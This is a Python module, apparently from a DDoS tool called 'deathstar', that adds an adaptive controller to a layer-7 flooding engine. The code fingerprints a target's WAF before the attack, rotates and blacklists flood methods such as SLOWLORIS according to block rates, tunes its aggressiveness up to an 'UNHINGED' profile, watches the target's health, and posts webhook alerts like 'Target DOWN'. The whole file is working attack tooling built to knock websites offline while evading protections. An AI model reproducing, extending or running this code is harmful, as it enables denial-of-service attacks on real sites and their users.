#!/usr/bin/env python3
"""Adaptive++ — enhanced adaptive controller layered on top of AdaptiveAttackEngine.

Adds:
  - Pre-attack WAF reconnaissance (seeds method weights before flooding)
  - Fast-cycle ResponseSwapper (5s) alongside slow Bayesian (8s)
  - Method blacklist with cooldown (failed methods get banned 30-60s, not just 5%)
  - TargetHealthMonitor with auto pause-resume
  - Adaptive heartbeat (3s when chaotic, 12s when stable)
  - Aggressiveness profiles (CALM/NORMAL/AGGRESSIVE/UNHINGED)
  - Webhook notifications on phase changes & target down/up
"""
from __future__ import annotations
import time
import threading
from contextlib import suppress
from typing import Optional, Callable, List, Dict


# ============================================================================
# Aggressiveness profiles — control how fast and how hard adaptive engine reacts
# ============================================================================
class Aggressiveness:
    """Profile presets that tune adaptive timing & risk tolerance."""

    CALM = {
        "name": "CALM",
        "min_heartbeat": 8.0,
        "max_heartbeat": 20.0,
        "swap_window": 8.0,
        "swap_block_threshold": 0.75,  # need 75% blocks before swap
        "blacklist_cooldown": 60.0,
        "min_active_methods": 3,
        "thread_burst_multiplier": 1.0,
        "stop_on_target_down": True,
    }
    NORMAL = {
        "name": "NORMAL",
        "min_heartbeat": 5.0,
        "max_heartbeat": 12.0,
        "swap_window": 5.0,
        "swap_block_threshold": 0.6,
        "blacklist_cooldown": 45.0,
        "min_active_methods": 4,
        "thread_burst_multiplier": 1.0,
        "stop_on_target_down": False,
    }
    AGGRESSIVE = {
        "name": "AGGRESSIVE",
        "min_heartbeat": 3.0,
        "max_heartbeat": 8.0,
        "swap_window": 3.0,
        "swap_block_threshold": 0.5,
        "blacklist_cooldown": 30.0,
        "min_active_methods": 5,
        "thread_burst_multiplier": 1.25,
        "stop_on_target_down": False,
    }
    UNHINGED = {
        "name": "UNHINGED",
        "min_heartbeat": 2.0,
        "max_heartbeat": 5.0,
        "swap_window": 2.0,
        "swap_block_threshold": 0.4,
        "blacklist_cooldown": 15.0,
        "min_active_methods": 6,
        "thread_burst_multiplier": 1.5,
        "stop_on_target_down": False,
    }

    PROFILES = {
        "CALM": CALM,
        "NORMAL": NORMAL,
        "AGGRESSIVE": AGGRESSIVE,
        "UNHINGED": UNHINGED,
    }

    @classmethod
    def get(cls, name: str) -> dict:
        return cls.PROFILES.get(name.upper(), cls.NORMAL)


# ============================================================================
# MethodBlacklist — temporarily ban methods that consistently fail
# ============================================================================
class MethodBlacklist:
    """When a method's block-rate stays above threshold for 2+ cycles,
       it gets blacklisted for `cooldown` seconds. Auto-rehabilitates after."""

    def __init__(self, cooldown_seconds: float = 45.0,
                 log_callback: Callable = None):
        self.cooldown = cooldown_seconds
        self.log = log_callback or (lambda *a, **k: None)
        self._banned: Dict[str, float] = {}  # method -> ban_until_timestamp
        self._failure_streak: Dict[str, int] = {}
        self._lock = threading.Lock()

    def report_failure(self, method: str, severity: float = 0.0):
        """Increment failure streak for a method.
           severity: 0.0–1.0 = how bad (e.g. err_rate). If >=0.85, ban INSTANTLY
           on first cycle instead of waiting for 2 (Cloudflare blocks in seconds,
           waiting 2 cycles wastes 10–24s of useless traffic on a banned method)."""
        with self._lock:
            self._failure_streak[method] = self._failure_streak.get(method, 0) + 1
            instant_ban = severity >= 0.85
            ban_threshold = 1 if instant_ban else 2
            if self._failure_streak[method] >= ban_threshold and method not in self._banned:
                self._banned[method] = time.time() + self.cooldown
                tag = "🚫 INSTABAN" if instant_ban else "🚫 BANNED"
                self.log(f"[Blacklist] {tag} {method} for {int(self.cooldown)}s "
                         f"(failed {self._failure_streak[method]} cycles, "
                         f"severity={severity:.0%})")


    def report_success(self, method: str):
        """Reset failure streak on success."""
        with self._lock:
            if method in self._failure_streak:
                self._failure_streak[method] = 0

    def is_banned(self, method: str) -> bool:
        with self._lock:
            until = self._banned.get(method, 0)
            if until == 0:
                return False
            if time.time() >= until:
                del self._banned[method]
                self._failure_streak[method] = 0
                self.log(f"[Blacklist] ♻ REHABILITATED {method} (cooldown expired)")
                return False
            return True

    def filter_methods(self, methods: List[str]) -> List[str]:
        """Return methods minus the currently banned ones."""
        return [m for m in methods if not self.is_banned(m)]

    def banned_list(self) -> List[str]:
        with self._lock:
            now = time.time()
            return [m for m, until in self._banned.items() if until > now]

    def clear_all(self):
        with self._lock:
            self._banned.clear()
            self._failure_streak.clear()


# ============================================================================
# EnhancedAdaptiveController — orchestrates engine + WAF probe + swapper +
# blacklist + health monitor + webhook. This is what gui.py talks to.
# ============================================================================
class EnhancedAdaptiveController:
    """High-level brain that wraps AdaptiveAttackEngine and adds the death-star
       layer. Designed to be drop-in compatible with gui.py's existing flow.

       Lifecycle:
         1. __init__()                — wire dependencies
         2. pre_attack_recon()        — fingerprint WAF, seed engine
         3. start()                   — kick off health monitor + webhook
         4. tick(rps, snapshot, ...)  — call every adaptive heartbeat
         5. report_response(method, code) — call from each request
         6. should_swap()             — fast 5s check, returns swap-out methods
         7. healthy_active_methods()  — filtered method list for thread spawn
         8. stop()                    — clean shutdown
    """

    def __init__(self,
                 engine,                       # AdaptiveAttackEngine instance
                 target_url: str,
                 all_l7_methods: List[str],
                 log_callback: Callable,
                 aggressiveness: str = "NORMAL",
                 webhook_notifier=None,        # deathstar_modules.WebhookNotifier
                 health_monitor=None,          # deathstar_modules.TargetHealthMonitor
                 enable_pre_recon: bool = True):
        self.engine = engine
        self.target_url = target_url
        self.all_methods = list(all_l7_methods)
        self.log = log_callback
        self.profile = Aggressiveness.get(aggressiveness)
        self.webhook = webhook_notifier
        self.health = health_monitor
        self.enable_pre_recon = enable_pre_recon

        self.blacklist = MethodBlacklist(
            cooldown_seconds=self.profile["blacklist_cooldown"],
            log_callback=log_callback,
        )
        # Lazy import (deathstar_modules) to avoid circular at module load
        try:
            from deathstar_modules import ResponseSwapper
            # min_samples=8 (was 20) — for low-RPS methods, 20 samples in 5s
            # is unreachable, so swapper effectively never fires. 8 is enough
            # for a meaningful block-rate estimate while still avoiding swaps
            # on transient blips (3-of-3 blocks doesn't trigger).
            self.swapper = ResponseSwapper(
                methods=self.all_methods,
                window_seconds=self.profile["swap_window"],
                block_threshold=self.profile["swap_block_threshold"],
                min_samples=8,
            )

        except Exception:
            self.swapper = None

        # Adaptive heartbeat (between min/max from profile)
        self.current_heartbeat = self.profile["min_heartbeat"]
        self.last_eval_time = 0.0
        self.consecutive_stable_cycles = 0
        self.consecutive_chaotic_cycles = 0

        # Recon results
        self.recon: Optional[dict] = None
        self.recommended_methods: List[str] = []

        self._stop = False

    # ----- 2. Pre-attack reconnaissance --------------------------------------
    def pre_attack_recon(self, timeout: float = 8.0) -> dict:
        """Run WAF fingerprint probe BEFORE attack starts. Returns recon dict.
           Side effect: seeds engine's strategy weights toward recommended methods."""
        if not self.enable_pre_recon:
            return {}
        try:
            from deathstar_modules import WAFFingerprint
        except ImportError:
            self.log("[Adaptive++] WAFFingerprint not available, skipping recon")
            return {}

        self.log("=" * 60)
        self.log("[Adaptive++] 🔍 Pre-attack reconnaissance starting...")
        self.log(f"[Adaptive++] Target: {self.target_url}")

        recon = WAFFingerprint.probe(self.target_url, timeout=timeout)
        self.recon = recon
        waf = recon.get("waf", "Unknown / None")
        server = recon.get("server", "")
        challenge = recon.get("challenge", False)
        rate_limit = recon.get("rate_limit", False)
        recommended = recon.get("recommended_methods", [])
        # Filter recommendations to only methods we actually have available
        self.recommended_methods = [m for m in recommended if m in self.all_methods]

        self.log(f"[Adaptive++] WAF detected: {waf}")
        if server:
            self.log(f"[Adaptive++] Server: {server}")
        if challenge:
            self.log(f"[Adaptive++] ⚠ JS challenge active — consider COOKIE_HARVEST first")
        if rate_limit:
            self.log(f"[Adaptive++] ⚠ Rate limiting active — STEALTH/EVEN methods recommended")
        for ind in recon.get("indicators", []):
            self.log(f"[Adaptive++]   • {ind}")
        if self.recommended_methods:
            self.log(f"[Adaptive++] 🎯 Recommended methods: {', '.join(self.recommended_methods[:6])}")

        # Seed engine portfolio: give recommended methods a head-start
        if self.recommended_methods and hasattr(self.engine, "portfolio"):
            for m in self.recommended_methods:
                if m in self.engine.portfolio.alpha:
                    # Bayesian prior boost: pretend it already won 5 times
                    self.engine.portfolio.alpha[m] += 5.0
            self.log("[Adaptive++] 🌱 Seeded Bayesian portfolio with WAF-specific priors")

        # Tag detected WAF on engine so it shows up in status
        if hasattr(self.engine, "detected_waf"):
            self.engine.detected_waf = waf

        # Webhook: announce attack start
        if self.webhook:
            self.webhook.send(
                "🎯 Attack Started",
                f"**Target:** `{self.target_url}`\n"
                f"**WAF:** {waf}\n"
                f"**Profile:** {self.profile['name']}\n"
                f"**Recommended:** {', '.join(self.recommended_methods[:5]) or 'default'}",
                key="attack_start",
                color=0x00AAFF,
            )

        self.log("=" * 60)
        return recon

    # ----- 3. Start: wire health monitor + webhook ---------------------------
    def start(self):
        """Begin background services. Call AFTER pre_attack_recon."""
        if self.health:
            # Wire callbacks: target down/up triggers webhook
            self.health.on_down = self._on_target_down
            self.health.on_up = self._on_target_up
            self.health.start()
            self.log(f"[Adaptive++] 💓 Target health monitor active "
                     f"(probe every {self.health.interval:.0f}s)")

    def _on_target_down(self, code, latency):
        msg = f"Target unreachable (code={code}, lat={latency})"
        self.log(f"[Adaptive++] 💀 {msg}")
        if self.webhook:
            self.webhook.send(
                "💀 Target DOWN",
                f"**{self.target_url}**\n{msg}\n\nThe attack appears successful.",
                key="target_down",
                color=0xFF0000,
            )

    def _on_target_up(self, code, latency):
        msg = f"Target back online (code={code}, lat={latency:.2f}s)" if latency else f"code={code}"
        self.log(f"[Adaptive++] ✅ {msg}")
        if self.webhook:
            self.webhook.send(
                "✅ Target Recovered",
                f"**{self.target_url}**\n{msg}",
                key="target_up",
                color=0x00FF00,
            )

    # ----- 4. Heartbeat tick (caller's main loop) ----------------------------
    def should_tick(self) -> bool:
        """Returns True if it's time to do a full evaluation cycle."""
        return (time.time() - self.last_eval_time) >= self.current_heartbeat

    def tick(self, current_rps: float, status_snapshot: dict,
             per_method_stats: dict = None) -> dict:
        """Full adaptive evaluation cycle. Adjusts heartbeat based on stability.
           Returns: {heartbeat, stable, dominant, banned, swapped_out}"""
        self.last_eval_time = time.time()

        # Delegate to underlying engine for Bayesian update + weight rotation
        with suppress(Exception):
            self.engine.evaluate_and_rotate(current_rps, status_snapshot,
                                            per_method_stats=per_method_stats)

        # --- Stability assessment ---
        total = sum(status_snapshot.values()) or 1
        error_rate = (status_snapshot.get("4xx", 0) +
                      status_snapshot.get("5xx", 0) +
                      status_snapshot.get("timeout", 0)) / total
        is_chaotic = error_rate > 0.5
        is_stable = error_rate < 0.2

        if is_stable:
            self.consecutive_stable_cycles += 1
            self.consecutive_chaotic_cycles = 0
        elif is_chaotic:
            self.consecutive_chaotic_cycles += 1
            self.consecutive_stable_cycles = 0

        # --- Adaptive heartbeat: shrink when chaotic, expand when stable ---
        if self.consecutive_chaotic_cycles >= 2:
            new_hb = max(self.profile["min_heartbeat"], self.current_heartbeat * 0.7)
        elif self.consecutive_stable_cycles >= 3:
            new_hb = min(self.profile["max_heartbeat"], self.current_heartbeat * 1.3)
        else:
            new_hb = self.current_heartbeat

        if abs(new_hb - self.current_heartbeat) > 0.5:
            self.log(f"[Adaptive++] ⏱ Heartbeat: {self.current_heartbeat:.1f}s → {new_hb:.1f}s "
                     f"({'chaotic' if is_chaotic else 'stable' if is_stable else 'normal'})")
        self.current_heartbeat = new_hb

        # --- Method blacklist update from per-method stats ---
        # Threshold lowered to 5 (was 10): for methods with low natural RPS
        # like SLOW/SLOWLORIS, 10 samples per heartbeat is rare. 5 is the
        # minimum for a meaningful failure-rate estimate.
        banned_now = []
        if per_method_stats:
            for m, (s2, s4, s5, st) in per_method_stats.items():
                method_total = s2 + s4 + s5 + st
                if method_total < 5:
                    continue  # not enough data
                m_err_rate = (s4 + s5 + st) / method_total
                if m_err_rate > self.profile["swap_block_threshold"]:
                    # Pass severity so MethodBlacklist can INSTABAN methods
                    # at >=85% failure (no need to wait 2 cycles)
                    self.blacklist.report_failure(m, severity=m_err_rate)
                    if self.blacklist.is_banned(m):
                        banned_now.append(m)
                else:
                    self.blacklist.report_success(m)


        # --- Webhook on big phase change ---
        if self.webhook and self.consecutive_chaotic_cycles == 3:
            self.webhook.send(
                "⚠ Adaptive: Heavy Blocking",
                f"Error rate {error_rate:.0%} on `{self.target_url}`\n"
                f"Banned methods: {', '.join(self.blacklist.banned_list()) or 'none'}",
                key="phase_chaotic",
                color=0xFFAA00,
            )

        return {
            "heartbeat": self.current_heartbeat,
            "stable": is_stable,
            "chaotic": is_chaotic,
            "error_rate": error_rate,
            "banned": list(self.blacklist.banned_list()),
            "banned_this_cycle": banned_now,
        }

    # ----- 5. Per-request reporting (cheap, called from hot path) ------------
    def report_response(self, method: str, status_code: int):
        if self.swapper is not None:
            self.swapper.report(method, status_code)

    # ----- 6. Fast 5s swap check (between heartbeats) ------------------------
    def should_swap(self) -> List[str]:
        """Returns list of methods that should be swapped out RIGHT NOW
           (faster than waiting for next heartbeat). Empty list = no swap needed."""
        if self.swapper is None:
            return []
        blocked = self.swapper.blocked_methods()
        # Don't swap if it would leave us below min_active_methods
        active_remaining = [m for m in self.healthy_active_methods() if m not in blocked]
        if len(active_remaining) < self.profile["min_active_methods"]:
            return []
        return blocked

    # ----- 7. Get the curated active method list ----------------------------
    def healthy_active_methods(self) -> List[str]:
        """Engine's active methods minus blacklisted minus swapper-blocked.
           Falls back to recon recommendations if everything is banned."""
        engine_methods = []
        with suppress(Exception):
            engine_methods = self.engine.get_active_methods()
        if not engine_methods:
            engine_methods = self.recommended_methods or self.all_methods

        # Filter through blacklist
        healthy = self.blacklist.filter_methods(engine_methods)

        # Ensure minimum count
        min_n = self.profile["min_active_methods"]
        if len(healthy) < min_n:
            # Pull in recommended methods that aren't banned
            for m in self.recommended_methods:
                if m not in healthy and not self.blacklist.is_banned(m):
                    healthy.append(m)
                    if len(healthy) >= min_n:
                        break
        if len(healthy) < min_n:
            for m in self.all_methods:
                if m not in healthy and not self.blacklist.is_banned(m):
                    healthy.append(m)
                    if len(healthy) >= min_n:
                        break
        return healthy

    # ----- 8. Stop --------------------------------------------------------
    def stop(self):
        self._stop = True
        with suppress(Exception):
            if self.health:
                self.health.stop()
        with suppress(Exception):
            self.engine.stop()
        if self.webhook:
            with suppress(Exception):
                self.webhook.send(
                    "🛑 Attack Stopped",
                    f"**Target:** `{self.target_url}`\n"
                    f"**Banned methods at end:** {', '.join(self.blacklist.banned_list()) or 'none'}",
                    key="attack_stopped",
                    color=0x808080,
                )

    # ----- Diagnostics ----------------------------------------------------
    def status_summary(self) -> str:
        banned = self.blacklist.banned_list()
        active = self.healthy_active_methods()
        return (f"profile={self.profile['name']} hb={self.current_heartbeat:.1f}s "
                f"active={len(active)} banned={len(banned)} "
                f"recon_waf={(self.recon or {}).get('waf', '?')}")
